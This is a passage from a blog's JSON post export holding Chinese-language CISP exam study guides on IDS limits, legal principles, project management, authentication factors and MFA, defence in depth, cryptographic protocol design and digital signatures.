B3[\"效力层级\"] C --> C1[\"向社会公布\"] C --> C2[\"公民可知晓\"] C --> C3[\"不能内部\"] D --> D1[\"长期有效\"] D --> D2[\"不常更改\"] D --> D3[\"保证权威\"] E --> E1[\"明确后果\"] E --> E2[\"强制执行\"] E --> E3[\"违法必究\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#fff3e0,stroke:#f57c00 style D fill:#e8f5e9,stroke:#388e3d style E fill:#ffcdd2,stroke:#c62828 2.3 法律的公开性 为什么法律必须公开： 法律公开的重要性： ├── 1. 保障公民权利 │ ├── 公民有权知道法律规定 │ ├── 了解自己的权利和义务 │ ├── 依法维护自身权益 │ └── 监督法律实施 ├── 2. 确保法律实施 │ ├── 公开才能遵守 │ ├── 不知法难以守法 │ ├── 提高法律意识 │ └── 促进依法行政 ├── 3. 维护法律权威 │ ├── 公开透明增强信任 │ ├── 防止暗箱操作 │ ├── 接受社会监督 │ └── 保证公平正义 └── 4. 法治原则要求 ├── 法治的基本要求 ├── 法律面前人人平等 ├── 不能有秘密法律 └── 保障司法公正 法律公开的方式： 公开方式 说明 示例 官方公报 政府公报、法律公报 全国人大公报 官方网站 政府和立法机关网站 中国人大网 新闻媒体 报纸、电视、网络 新闻联播 法律汇编 法律法规汇编出版物 法律出版社 公共图书馆 法律资料查阅 各级图书馆 &quot;内部&quot;规定的性质： ⚠️ 内部规定不是法律内部规定的特点： 不对外公开 仅在组织内部适用 不具有法律效力 不能作为执法依据 内部规定的作用： 组织内部管理 工作流程规范 纪律要求 但不能违反法律 与法律的区别： 法律必须公开，内部规定不公开 法律具有普遍约束力，内部规定仅限内部 法律由国家强制力保证，内部规定靠组织纪律 法律是&quot;硬约束&quot;，内部规定是&quot;软约束&quot; 2.4 法律的稳定性 法律稳定性的意义： 意义 说明 重要性 保证可预期性 公民可以预期行为后果 维护法律秩序 维护权威性 法律不能朝令夕改 增强法律信任 保障权利 稳定的法律保护权利 保护公民权益 促进发展 稳定的法律环境 经济社会发展 法律的修改和废止： 📋 法律可以修改，但需要法定程序 ⏱️ 修改不能过于频繁 🔄 重大修改需要充分论证 📢 修改后需要重新公布 ⚖️ 保持法律体系的协调 2.5 法律的强制性 法律的&quot;硬约束&quot;特征： graph TB A[\"法律的硬约束\"] B[\"明确规定\"] C[\"强制执行\"] D[\"违法必究\"] E[\"法律责任\"] A --> B A --> C A --> D A --> E B --> B1[\"行为规范\"] B --> B2[\"权利义务\"] B --> B3[\"法律后果\"] C --> C1[\"国家强制力\"] C --> C2[\"司法机关\"] C --> C3[\"执法机关\"] D --> D1[\"有法必依\"] D --> D2[\"执法必严\"] D --> D3[\"违法必究\"] E --> E1[\"民事责任\"] E --> E2[\"行政责任\"] E --> E3[\"刑事责任\"] style A fill:#ffcdd2,stroke:#c62828 style B fill:#fff3e0,stroke:#f57c00 style C fill:#e8f5e9,stroke:#388e3d style D fill:#e3f2fd,stroke:#1976d2 style E fill:#f3e5f5,stroke:#7b1fa2 法律责任的类型： 法律责任： ├── 民事责任 │ ├── 赔偿损失 │ ├── 恢复原状 │ ├── 停止侵害 │ └── 赔礼道歉 ├── 行政责任 │ ├── 警告 │ ├── 罚款 │ ├── 没收违法所得 │ ├── 责令停产停业 │ └── 行政拘留 └── 刑事责任 ├── 管制 ├── 拘役 ├── 有期徒刑 ├── 无期徒刑 └── 死刑 2.6 信息安全相关法律 主要信息安全法律法规： 法律法规 颁布时间 主要内容 网络安全法 2017年 网络安全基本法 数据安全法 2021年 数据安全保护 个人信息保护法 2021年 个人信息保护 密码法 2020年 密码管理和应用 刑法（相关条款） 多次修订 网络犯罪处罚 信息安全法律的特点： 📋 公开发布，全社会知晓 ⚖️ 具有强制约束力 🔒 保护网络和数据安全 👥 保护个人信息权益 ⚡ 明确法律责任 三、总结 入侵检测系统与法律基础的核心要点： IDS局限性：配置复杂、高误报率、自身安全、日志完整性 法律特点：国家意志、必须公开、相对稳定、硬约束 🎯 关键要点 IDS对用户知识要求高，配置和管理复杂（不是简单） IDS会产生大量告警，误报率高 IDS自身可能被攻击，影响检测能力 日志不完整影响入侵行为关联分析 法律是国家意志的统一体现 法律必须公开，不能是&quot;内部&quot;的 法律相对稳定，不允许经常更改 法律是&quot;硬约束&quot;，有明确的法律后果 💡 实践建议 部署IDS需要专业人员 持续优化规则降低误报 保护IDS自身安全 确保日志完整性 结合IDS和IPS使用 学习和遵守信息安全法律 关注法律法规更新 建立合规管理体系","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"CISP","slug":"CISP","permalink":"https://neo01.com/tags/CISP/"}],"lang":"zh-CN"},{"title":"CISP学习指南：项目管理基础","slug":"2025/10/CISP-Project-Management-Basics-zh-CN","date":"un22fin22","updated":"un33fin33","comments":true,"path":"/zh-CN/2025/10/CISP-Project-Management-Basics/","permalink":"https://neo01.com/zh-CN/2025/10/CISP-Project-Management-Basics/","excerpt":"深入解析CISP认证中的项目管理基础知识，包括项目定义、特征和SMART原则。","text":"项目管理是信息安全项目实施的重要基础，理解项目的基本概念和管理原则对于成功实施安全项目至关重要。 一、项目的定义 1.1 项目的含义 📋 项目的定义项目是： 为达到特定目的 使用一定资源 在确定的期间内 为特定发起人 提供独特的产品、服务或成果 进行的一次性努力 项目的关键要素： 项目的关键要素： ├── 目的性 │ └── 有明确的目标和预期成果 ├── 资源约束 │ └── 人力、资金、物资等资源有限 ├── 时间约束 │ └── 有明确的开始和结束时间 ├── 独特性 │ └── 产品或服务具有独特性 └── 一次性 └── 不是重复性的日常运营 二、项目的特征 2.1 项目的四大特征 项目的关键特征： graph TB A[\"项目特征\"] B[\"临时性\"] C[\"独特性\"] D[\"渐进明细\"] E[\"目标明确\"] A --> B A --> C A --> D A --> E B --> B1[\"有明确的开始和结束\"] C --> C1[\"产品或服务独特\"] D --> D1[\"逐步完善\"] E --> E1[\"遵循SMART原则\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#fff3e0,stroke:#f57c00 style D fill:#e8f5e9,stroke:#388e3d style E fill:#f3e5f5,stroke:#7b1fa2 特征详解： 特征 说明 示例 临时性 有明确的开始和结束日期 信息安全系统建设项目：2024年1月-6月 独特性 产品或服务具有独特性 为特定企业定制的安全解决方案 渐进明细 随着项目推进逐步完善 需求分析→设计→开发→测试→部署 目标明确 遵循SMART原则 3个月内实施多因素认证系统 三、项目理解的常见错误 3.1 关于项目的理解分析 关于项目的理解分析： 说法 正确性 说明 A. 项目是一次性努力 ✅ 正确 项目有明确的开始和结束 B. 结束日期随机确定 ❌ 错误 结束日期应在规划时确定 C. 项目资源指人财物 ✅ 正确 包括人力、资金、物资等 D. 目标遵守SMART原则 ✅ 正确 具体、可测量、一致同意、现实、有时限 3.2 错误理解分析 错误理解：B. 项目有明确的开始日期，结束日期由项目的领导者根据项目进度来随机确定 ⚠️ 为什么B选项错误错误原因： 项目的结束日期不是&quot;随机确定&quot;的 结束日期应该在项目规划阶段就明确 虽然可能因实际情况调整，但不是随机决定 项目管理强调计划性和可预测性 正确理解： 项目有明确的开始日期和结束日期 结束日期在项目规划时确定 可能根据实际情况进行调整 但调整应基于科学的评估，不是随机决定 正确答案：B（错误的理解） 四、SMART原则 4.1 SMART原则概述 项目目标的SMART原则： SMART原则： ├── S - Specific（具体的） │ └── 目标要明确具体，不能模糊 ├── M - Measurable（可测量的） │ └── 目标要可以量化和评估 ├── A - Agree to（一致同意的） │ └── 相关方对目标达成一致 ├── R - Realistic（现实的） │ └── 目标要切实可行 └── T - Time-oriented（有时限的） └── 目标要有明确的时间期限 4.2 SMART原则详解 SMART各要素说明： 原则 英文 含义 关键问题 S Specific 具体的 目标是否明确具体？ M Measurable 可测量的 如何衡量目标达成？ A Agree to 一致同意的 相关方是否同意？ R Realistic 现实的 目标是否可实现？ T Time-oriented 有时限的 何时完成目标？ 4.3 SMART原则应用示例 SMART原则示例： 原则 不好的目标 好的目标 Specific 提高系统安全性 实施多因素认证系统 Measurable 减少安全事件 将安全事件减少30% Agree to 单方面决定 与相关部门协商一致 Realistic 100%防止所有攻击 防止90%的已知攻击 Time-oriented 尽快完成 3个月内完成 信息安全项目目标示例： 不符合SMART的目标： &quot;提高公司的信息安全水平&quot; 符合SMART的目标： &quot;在2024年6月30日前，为公司所有员工（500人）部署多因素认证系统， 使账户被盗用事件减少80%，项目预算不超过50万元， 经IT部门、安全部门和人力资源部门共同评审通过。&quot; 分析： ├── S - Specific：部署多因素认证系统 ├── M - Measurable：账户被盗用事件减少80% ├── A - Agree to：经三个部门共同评审通过 ├── R - Realistic：预算50万元，技术可行 └── T - Time-oriented：2024年6月30日前完成 五、项目管理在信息安全中的应用 5.1 信息安全项目特点 信息安全项目的特殊性： 信息安全项目特点： ├── 技术复杂性高 │ └── 涉及多种安全技术和产品 ├── 风险管理要求高 │ └── 需要识别和控制安全风险 ├── 合规性要求 │ └── 需符合法律法规和标准 ├── 持续性要求 │ └── 安全是持续的过程 └── 跨部门协作 └── 需要多部门配合 5.2 信息安全项目管理要点 关键管理要点： 管理领域 要点 说明 范围管理 明确项目边界 定义清晰的项目范围 时间管理 制定合理进度 考虑安全测试时间 成本管理 控制项目预算 包括软硬件和人力成本 质量管理 确保安全质量 进行安全测试和验收 风险管理 识别和控制风险 制定风险应对措施 沟通管理 保持有效沟通 定期汇报项目进展 六、总结 项目管理基础的核心要点： 🎯 关键要点 项目是为达到特定目的进行的一次性努力 项目有明确的开始和结束日期，结束日期应在规划时确定 项目具有临时性、独特性、渐进明细和目标明确四大特征 项目资源包括人力、资金、物资等 项目目标应遵循SMART原则：具体、可测量、一致同意、现实、有时限 结束日期不是随机确定的，而是基于科学规划 💡 实践建议 项目启动前明确项目目标和范围 制定符合SMART原则的项目目标 在规划阶段确定项目时间表 识别和管理项目风险 保持与相关方的有效沟通 定期监控项目进度和质量 根据实际情况科学调整计划","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"CISP","slug":"CISP","permalink":"https://neo01.com/tags/CISP/"}],"lang":"zh-CN"},{"title":"CISP学习指南：身份鉴别方法","slug":"2025/10/CISP-Authentication-Methods-zh-CN","date":"un11fin11","updated":"un33fin33","comments":true,"path":"/zh-CN/2025/10/CISP-Authentication-Methods/","permalink":"https://neo01.com/zh-CN/2025/10/CISP-Authentication-Methods/","excerpt":"深入解析CISP认证中的身份鉴别方法，包括实体所知、实体所有和实体特征三大类鉴别方法。","text":"身份鉴别是信息安全的第一道防线，通过验证用户身份来确保只有合法用户才能访问系统资源。 一、身份鉴别概述 1.1 什么是身份鉴别 🔐 身份鉴别定义**身份鉴别（Authentication）**是验证用户声称身份真实性的过程，确保访问系统的用户就是其所声称的那个人。 核心目标： 验证用户身份的真实性 防止身份冒用 为访问控制提供基础 建立可审计的用户行为 1.2 身份鉴别的重要性 为什么需要身份鉴别： 🛡️ 防止未授权访问 🔒 保护敏感信息 📋 满足合规要求 🔍 支持审计追踪 ⚖️ 明确责任归属 二、身份鉴别方法分类 2.1 三大类鉴别方法 📊 身份鉴别方法分类实体身份鉴别的方法多种多样，且随着技术的进步，鉴别方法的强度不断提高。常见的方法可以分为三大类： 实体所知的鉴别方法（Something You Know） 基于用户知道的信息 如：口令、密码、PIN码 实体所有的鉴别方法（Something You Have） 基于用户拥有的物品 如：令牌、智能卡、手机 实体特征的鉴别方法（Something You Are） 基于用户的生物特征 如：指纹、虹膜、面部识别 graph TB A[\"身份鉴别方法\"] B[\"实体所知Something You Know\"] C[\"实体所有Something You Have\"] D[\"实体特征Something You Are\"] A --> B A --> C A --> D B --> B1[\"口令/密码\"] B --> B2[\"PIN码\"] B --> B3[\"安全问题\"] C --> C1[\"令牌\"] C --> C2[\"智能卡\"] C --> C3[\"手机\"] D --> D1[\"指纹\"] D --> D2[\"虹膜\"] D --> D3[\"面部识别\"] D --> D4[\"声纹\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#fff3e0,stroke:#f57c00 style D fill:#e8f5e9,stroke:#388e3d 三、实体所知的鉴别方法 3.1 口令鉴别 🔑 口令鉴别**定义：**基于用户知道的秘密信息进行身份验证。 常见形式： 密码（Password） 个人识别码（PIN） 通行短语（Passphrase） 安全问题答案 口令鉴别的优缺点： 优点 缺点 ✅ 实现简单 ❌ 容易被猜测 ✅ 成本低廉 ❌ 容易被窃取 ✅ 用户熟悉 ❌ 容易被遗忘 ✅ 易于部署 ❌ 容易被共享 3.2 口令安全最佳实践 强口令策略： 强口令要求： ├── 长度要求 │ └── 至少8-12个字符 ├── 复杂度要求 │ ├── 包含大写字母 │ ├── 包含小写字母 │ ├── 包含数字 │ └── 包含特殊字符 ├── 历史限制 │ └── 不能重复使用最近N个口令 └── 定期更换 └── 每90天更换一次 口令存储安全： 🔐 使用加密哈希存储 🧂 添加盐值（Salt） 🔄 使用慢速哈希算法（如bcrypt、scrypt） ❌ 永远不要明文存储 四、实体所有的鉴别方法 4.1 令牌鉴别 🎫 令牌鉴别**定义：**基于用户拥有的物理或虚拟令牌进行身份验证。 常见类型： 硬件令牌（如RSA SecurID） 软件令牌（如Google Authenticator） 智能卡 USB密钥 手机短信验证码 令牌类型对比： 令牌类型 原理 优点 缺点 硬件令牌 生成动态密码 安全性高 成本高、易丢失 软件令牌 手机APP生成 成本低、便捷 依赖手机 智能卡 芯片存储密钥 安全性高 需要读卡器 USB密钥 物理密钥 使用简单 易丢失 短信验证码 手机接收 普及率高 可被拦截 4.2 动态口令令牌 TOTP（基于时间的一次性密码）： TOTP工作原理： ├── 共享密钥 │ └── 服务器和令牌共享密钥 ├── 时间同步 │ └── 基于当前时间生成密码 ├── 哈希计算 │ └── HMAC-SHA1(密钥, 时间) └── 密码生成 └── 每30秒生成新密码 五、实体特征的鉴别方法 5.1 生物特征鉴别 👤 生物特征鉴别**定义：**基于用户独特的生物特征进行身份验证。 常见生物特征： 指纹识别 虹膜识别 面部识别 声纹识别 静脉识别 步态识别 指纹鉴别的分类： 在移动支付等应用场景中，指纹鉴别已成为常见的身份验证方式。用户通过指纹验证身份后，才能进行支付、转账等操作。指纹鉴别属于实体特征的鉴别方法。 为什么指纹属于实体特征： ✅ 指纹是生物特征：属于用户独特的生理特征 ✅ 基于&quot;你是什么&quot;：Something You Are的典型代表 ✅ 无法转移：不同于密码可以告诉别人，或令牌可以转移 ✅ 唯一性强：每个人的指纹都是独一无二的 与其他方法的区别： ❌ 不是实体所知：指纹不是用户&quot;知道&quot;的信息（如密码、PIN码） ❌ 不是实体所有：指纹不是用户&quot;拥有&quot;的物品（如令牌、智能卡） ❌ 不存在&quot;实体所见&quot;：这不是标准的身份鉴别方法分类 📊 三大类鉴别方法对比| 分类 | 英文 | 基于 | 示例 | 特点 | |------|------|------|------|------| | 实体所知 | Something You Know | 知识 | 口令、密码 | 可以告诉别人 | | 实体所有 | Something You Have | 物品 | 令牌、智能卡 | 可以转移 | | 实体特征 | Something You Are | 生物特征 | 指纹、虹膜 | 无法转移 | 5.2 生物特征识别技术 指纹识别： graph LR A[\"指纹采集\"] --> B[\"特征提取\"] B --> C[\"特征比对\"] C --> D[\"身份确认\"] style A fill:#e3f2fd,stroke:#1976d2 style B fill:#fff3e0,stroke:#f57c00 style C fill:#e8f5e9,stroke:#388e3d style D fill:#f3e5f5,stroke:#7b1fa2 生物特征识别的优缺点： 优点 缺点 ✅ 唯一性强 ❌ 成本较高 ✅ 难以伪造 ❌ 可能有误识率 ✅ 无需记忆 ❌ 隐私问题 ✅ 无法转移 ❌ 无法更换 ✅ 用户体验好 ❌ 环境影响 5.3 常见生物特征对比 生物特征 唯一性 稳定性 采集难度 用户接受度 成本 指纹 ⭐⭐⭐⭐ ⭐⭐⭐⭐ ⭐⭐⭐⭐⭐ ⭐⭐⭐⭐⭐ 低 虹膜 ⭐⭐⭐⭐⭐ ⭐⭐⭐⭐⭐ ⭐⭐⭐ ⭐⭐⭐ 高 面部 ⭐⭐⭐ ⭐⭐⭐ ⭐⭐⭐⭐⭐ ⭐⭐⭐⭐⭐ 中 声纹 ⭐⭐⭐ ⭐⭐⭐ ⭐⭐⭐⭐ ⭐⭐⭐⭐ 低 静脉 ⭐⭐⭐⭐⭐ ⭐⭐⭐⭐⭐ ⭐⭐⭐ ⭐⭐⭐ 高 六、多因素认证（MFA） 6.1 多因素认证概述 🔐 多因素认证**定义：**结合两种或多种不同类型的鉴别方法进行身份验证。 常见组合： 密码 + 短信验证码 密码 + 硬件令牌 密码 + 指纹 智能卡 + PIN码 多因素认证的优势： 🛡️ 显著提高安全性 🔒 即使一个因素被破解，仍有其他保护 📊 满足高安全等级要求 ✅ 符合合规标准 6.2 双因素认证示例 移动支付的双因素认证： 移动支付认证流程： ├── 第一因素：密码 │ └── 用户输入支付密码 ├── 第二因素：指纹 │ └── 用户验证指纹 └── 认证成功 └── 允许支付操作 sequenceDiagram participant U as 用户 participant A as 支付应用 participant S as 支付服务器 U->>A: 1. 输入支付密码 A->>A: 2. 验证密码 A->>U: 3. 请求指纹验证 U->>A: 4. 提供指纹 A->>A: 5. 验证指纹 A->>S: 6. 发送认证请求 S->>A: 7. 认证成功 A->>U: 8. 允许支付 style A fill:#e3f2fd,stroke:#1976d2 style S fill:#e8f5e9,stroke:#388e3d 七、身份鉴别的安全考虑 7.1 鉴别强度 鉴别方法强度排序： 安全强度（从低到高）： ├── 单因素认证 │ ├── 仅密码（最弱） │ ├── 仅令牌 │ └── 仅生物特征 ├── 双因素认证 │ ├── 密码 + 短信 │ ├── 密码 + 令牌 │ └── 密码 + 生物特征 └── 多因素认证（最强） └── 三种或以上因素组合 7.2 常见攻击方式 针对不同鉴别方法的攻击： 鉴别方法 常见攻击 防护措施 口令 暴力破解、字典攻击、钓鱼 强口令策略、账户锁定、MFA 令牌 令牌窃取、中间人攻击 设备绑定、加密通信 生物特征 伪造、重放攻击 活体检测、多因素认证 7.3 最佳实践 身份鉴别安全建议： ✅ 使用多因素认证 ✅ 实施强口令策略 ✅ 定期更换凭证 ✅ 监控异常登录 ✅ 实施账户锁定机制 ✅ 加密存储凭证 ✅ 使用安全的传输协议 ✅ 定期安全审计 八、总结 身份鉴别方法的核心要点： 三大类方法：实体所知、实体所有、实体特征 指纹鉴别：属于实体特征的鉴别方法 多因素认证：结合多种方法提高安全性 安全强度：多因素 &gt; 单因素 🎯 关键要点 身份鉴别分为三大类：所知、所有、特征 指纹鉴别属于实体特征的鉴别方法 口令鉴别属于实体所知的鉴别方法 令牌鉴别属于实体所有的鉴别方法 多因素认证显著提高安全性 生物特征具有唯一性和不可转移性 💡 考试提示 记住三大类鉴别方法的英文：Something You Know/Have/Are 指纹、虹膜、面部识别都属于实体特征 令牌、智能卡、手机属于实体所有 密码、PIN码、安全问题属于实体所知 多因素认证是当前最佳实践","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"CISP","slug":"CISP","permalink":"https://neo01.com/tags/CISP/"}],"lang":"zh-CN"},{"title":"CISP学习指南：安全机制、密码协议与数字签名","slug":"2025/10/CISP-Security-Mechanisms-Protocols-zh-CN","date":"un11fin11","updated":"un33fin33","comments":true,"path":"/zh-CN/2025/10/CISP-Security-Mechanisms-Protocols/","permalink":"https://neo01.com/zh-CN/2025/10/CISP-Security-Mechanisms-Protocols/","excerpt":"深入解析CISP认证中的安全机制、密码协议设计原则和数字签名应用知识点。","text":"安全机制和密码协议是构建安全系统的基础，理解其原理和应用对信息安全至关重要。 一、安全机制与深度防御 1.1 安全缺陷的普遍性 安全产品的局限性： ⚠️ 安全产品的现实即使最好用的安全产品也存在安全缺陷。 为什么会存在安全缺陷： 🔧 技术复杂性 软件系统复杂 代码量庞大 难以完全测试 🔄 持续演进 新威胁不断出现 攻击技术进步 零日漏洞存在 👥 人为因素 设计缺陷 实现错误 配置不当 1.2 多层防御策略 💡 深度防御的核心原则深度防御策略的关键要素： 即使最好用的安全产品也存在安全缺陷。结果，在任何的系统中敌手最终都能够找出一个被开发出的漏洞，一种有效的对策是在敌手和安全目标之间配备多种安全机制，每一种机制都应包括保护和检测两种手段。 三个关键概念： 🔓 安全缺陷 任何安全产品都不可能完美 总会存在未知漏洞 需要承认这一现实 🛡️ 多种安全机制 不依赖单一防护措施 部署多层防御体系 增加攻击难度和成本 🔍 保护和检测 保护：主动防御措施 检测：被动监控措施 两者缺一不可 深度防御的核心思想： graph TB A[\"深度防御策略\"] B[\"承认安全缺陷不可避免\"] C[\"部署多种安全机制\"] D[\"每种机制包含保护和检测\"] E[\"形成纵深防御体系\"] A --> B B --> C C --> D D --> E B --> B1[\"任何产品都有缺陷\"] C --> C1[\"多层防护\"] D --> D1[\"主动防御\"] D --> D2[\"被动检测\"] E --> E1[\"提高攻击成本\"] style B fill:#ffebee,stroke:#c62828 style C fill:#fff3e0,stroke:#f57c00 style D fill:#e8f5e9,stroke:#388e3d style E fill:#e3f2fd,stroke:#1976d2 1.3 保护与检测机制 安全机制的两种手段： 安全机制的两种手段： ├── 1. 保护（Protection） │ ├── 定义：主动防御措施 │ ├── 目的：阻止攻击发生 │ ├── 特点： │ │ ├── 预防性 │ │ ├── 主动性 │ │ └── 实时性 │ └── 示例： │ ├── 防火墙 │ ├── 访问控制 │ ├── 加密 │ ├── 身份认证 │ └── 安全配置 └── 2. 检测（Detection） ├── 定义：被动监控措施 ├── 目的：发现攻击行为 ├── 特点： │ ├── 响应性 │ ├── 被动性 │ └── 事后性 └── 示例： ├── 入侵检测系统（IDS） ├── 日志审计 ├── 异常监控 ├── 安全扫描 └── 行为分析 保护与检测的关系： graph LR A[\"攻击者\"] --> B[\"保护机制\"] B -->|\"突破\"| C[\"检测机制\"] C -->|\"发现\"| D[\"响应机制\"] D -->|\"加固\"| B B --> B1[\"防火墙\"] B --> B2[\"访问控制\"] C --> C1[\"IDS/IPS\"] C --> C2[\"日志审计\"] D --> D1[\"事件响应\"] D --> D2[\"漏洞修复\"] style B fill:#e8f5e9,stroke:#388e3d style C fill:#fff3e0,stroke:#f57c00 style D fill:#e3f2fd,stroke:#1976d2 1.4 多层安全机制示例 典型的多层防御架构： 层次 保护机制 检测机制 目的 网络边界 防火墙、IPS IDS、流量分析 阻止外部攻击 网络内部 VLAN隔离、ACL 网络监控、异常检测 限制横向移动 主机层 主机防火墙、加固 主机IDS、日志 保护单个系统 应用层 WAF、输入验证 应用日志、审计 保护应用安全 数据层 加密、访问控制 数据审计、DLP 保护数据安全 为什么需要多种机制： 🛡️ 多层防御的必要性单一机制的局限： 任何单一机制都可能被突破 存在未知漏洞 配置可能不当 多层防御的优势： 攻击者需要突破多道防线 增加攻击难度和成本 提供多次检测机会 即使一层失效，其他层仍可防护 保护+检测的必要性： 保护机制可能被绕过 检测机制提供第二道防线 及时发现攻击行为 支持事件响应和改进 二、密码协议 2.1 密码协议概述 密码协议的定义： 🔐 密码协议Cryptographic Protocol（也称安全协议 Security Protocol） 使用密码学完成某项特定任务并满足安全需求的协议。 核心特点： 📋 定义明确 定义两方或多方之间的步骤 为完成某项任务而制定 每个参与方都必须了解协议 🔄 步骤执行 按照规定步骤执行 顺序不能随意改变 每步都有明确要求 🎯 安全目标 提供安全服务 满足安全需求 防止安全威胁 2.2 密码协议设计原则 💡 密码协议设计的正确原则密码协议设计的核心要求： 密码学是网络安全的基础，但网络安全不能单纯依靠安全的密码算法，密码协议也是网络安全的一个重要组成部分。 ✅ 必须明确定义所有步骤 密码协议定义了两方或多方之间为完成某项任务而制定的一系列步骤 协议中的每个参与方都必须了解协议，且按步骤执行 所有步骤必须明确，不能模糊或不明确 复杂步骤更需要明确处理方式，否则可能导致安全漏洞 ✅ 适用于不同信任场景 根据密码协议应用目的的不同，参与该协议的双方可能是朋友和完全信任的人 也可能是敌人和互相完全不信任的人 可以是信任环境（如内部通信） 也可以是零信任环境（如电子商务） ✅ 提供安全服务 密码协议（Cryptographic protocol），有时也称安全协议（security protocol） 是使用密码学完成某项特定的任务并满足安全需求的协议 其目的是提供安全服务 ❌ 常见误区：过度灵活 不应按照灵活性好、可扩展性高的方式制定而不限制执行步骤 不能让复杂的步骤处理方式不明确 这会导致安全漏洞和实现不一致 密码协议设计的正确原则： graph TB A[\"密码协议设计原则\"] B[\"❌ 错误做法\"] C[\"✅ 正确做法\"] A --> B A --> C B --> B1[\"步骤模糊\"] B --> B2[\"处理方式不明确\"] B --> B3[\"过度灵活\"] C --> C1[\"步骤明确\"] C --> C2[\"处理方式清晰\"] C --> C3[\"严格定义\"] B1 --> B1A[\"可能被误解\"] B2 --> B2A[\"可能有漏洞\"] B3 --> B3A[\"难以验证\"] C1 --> C1A[\"易于实现\"] C2 --> C2A[\"安全可靠\"] C3 --> C3A[\"可以验证\"] style B fill:#ffcdd2,stroke:#b71c1c style C fill:#c8e6c9,stroke:#2e7d32 2.3 密码协议设计要求 密码协议的关键要求： 密码协议设计要求： ├── 1. 明确性 │ ├── 所有步骤必须明确定义 │ ├── 每个步骤的输入输出清晰 │ ├── 处理方式不能模糊 │ └── 异常情况有明确处理 ├── 2. 完整性 │ ├── 覆盖所有可能场景 │ ├── 包含所有必要步骤 │ ├── 考虑边界条件 │ └── 处理错误情况 ├── 3. 安全性 │ ├── 抵抗已知攻击 │ ├── 考虑潜在威胁 │ ├── 使用安全的密码算法 │ └── 正确使用密钥 ├── 4. 可验证性 │ ├── 可以形式化验证 │ ├── 可以测试验证 │ ├── 安全属性可证明 │ └── 实现可审计 └── 5. 实用性 ├── 效率合理 ├── 易于实现 ├── 兼容性好 └── 可扩展性适当 2.4 密码协议的信任模型 不同信任场景下的协议： 信任关系 场景示例 协议特点 典型协议 完全信任 内部系统通信 相对简单，重点在效率 Kerberos 部分信任 企业间合作 需要验证，但有基础信任 SSL/TLS 零信任 电子商务 严格验证，不信任任何方 SET协议 互不信任 匿名交易 最复杂，需要第三方 数字现金协议 密码协议示例： 🔒 SSL/TLS握手协议步骤明确的协议示例： 客户端Hello 发送支持的协议版本 发送支持的加密套件 发送随机数 服务器Hello 选择协议版本 选择加密套件 发送随机数 发送服务器证书 客户端验证 验证服务器证书 生成预主密钥 用服务器公钥加密 发送给服务器 密钥协商 双方计算会话密钥 切换到加密通信 每个步骤都有明确定义，不能省略或模糊处理。 三、数字签名应用 3.1 数字签名功能回顾 数字签名的核心功能： 💡 数字签名的正确理解数字签名的核心特性： ✅ 与数据密切相关 数字签名不是和传输数据毫无关系的数字信息 签名是对数据摘要的加密 签名值由数据内容决定 数据改变，签名也会改变 ✅ 使用非对称加密 数字签名使用非对称加密机制，不是对称加密 用私钥签名 用公钥验证 保证只有持有私钥的人能签名 ✅ 解决篡改和伪造问题 防止数据被篡改（完整性） 防止签名被伪造（认证性） 防止发送方抵赖（不可否认性） 这是数字签名的核心功能 ❌ 不提供加密功能 数字签名不能解决数据的加密传输问题 签名只提供认证和完整性 不提供机密性保护 需要结合加密才能保密传输 数字签名的正确理解： graph TB A[\"数字签名\"] B[\"使用非对称加密\"] C[\"基于数据内容\"] D[\"提供安全保障\"] A --> B A --> C A --> D B --> B1[\"私钥签名\"] B --> B2[\"公钥验证\"] C --> C1[\"计算数据摘要\"] C --> C2[\"签名与数据相关\"] D --> D1[\"防篡改\"] D --> D2[\"防伪造\"] D --> D3[\"防抵赖\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#fff3e0,stroke:#f57c00 style D fill:#e8f5e9,stroke:#388e3d 3.2 数字签名的工作原理 签名生成和验证过程： 数字签名流程： ├── 签名生成（发送方） │ ├── 1. 计算消息摘要 │ │ └── Hash(消息) &#x3D; 摘要 │ ├── 2. 用私钥加密摘要 │ │ └── Encrypt(摘要, 私钥) &#x3D; 签名 │ └── 3. 附加签名发送 │ └── 发送：消息 + 签名 └── 签名验证（接收方） ├── 1. 计算接收消息的摘要 │ └── Hash(接收消息) &#x3D; 摘要1 ├── 2. 用公钥解密签名 │ └── Decrypt(签名, 公钥) &#x3D; 摘要2 └── 3. 对比两个摘要 ├── 摘要1 &#x3D;&#x3D; 摘要2 → 验证成功 └── 摘要1 !&#x3D; 摘要2 → 验证失败 3.3 数字签名解决的问题 数字签名的安全保障： 安全问题 数字签名如何解决 原理 篡改 ✅ 能解决 数据改变导致摘要改变，签名验证失败 伪造 ✅ 能解决 没有私钥无法生成有效签名 冒充 ✅ 能解决 公钥验证确认发送方身份 抵赖 ✅ 能解决 只有发送方有私钥，无法否认 窃听 ❌ 不能解决 签名不加密消息内容 重放 ⚠️ 需配合其他机制 需要添加时间戳或序列号 3.4 数字签名与加密的结合 完整的安全通信方案： 🔒 数字签名 + 加密 = 完整安全单独使用数字签名： ✅ 提供认证 ✅ 提供完整性 ✅ 提供不可否认性 ❌ 不提供机密性 结合加密使用： 先签名后加密 或先加密后签名 提供完整的安全保障 完整流程： 发送方用私钥签名（认证） 发送方用接收方公钥加密（保密） 接收方用私钥解密（获取内容） 接收方用发送方公钥验证（验证身份） 四、TCP/IP协议栈安全协议 4.1 TCP/IP协议栈层次 💡 TCP/IP协议栈安全协议的层次划分各层安全协议的正确归属： 由于Internet的安全问题日益突出，基于TCP/IP协议相关组织和专家在协议的不同层次设计了相应的安全通信协议，用来保障网络各层次的安全。 ✅ 传输层安全协议：SSL/TLS SSL（安全套接字层）属于传输层 位于TCP和应用层之间 为应用层协议提供安全服务 典型应用：HTTPS、SMTPS、FTPS 🌐 网络层安全协议：IPsec IPsec（IP安全协议）属于网络层 在IP层实现 对IP数据包进行保护 典型应用：VPN 🔗 数据链路层安全协议：L2TP、PP2P L2TP（第二层隧道协议）属于数据链路层 PP2P/PPTP（点对点隧道协议）属于数据链路层 封装链路层帧 典型应用：远程访问VPN 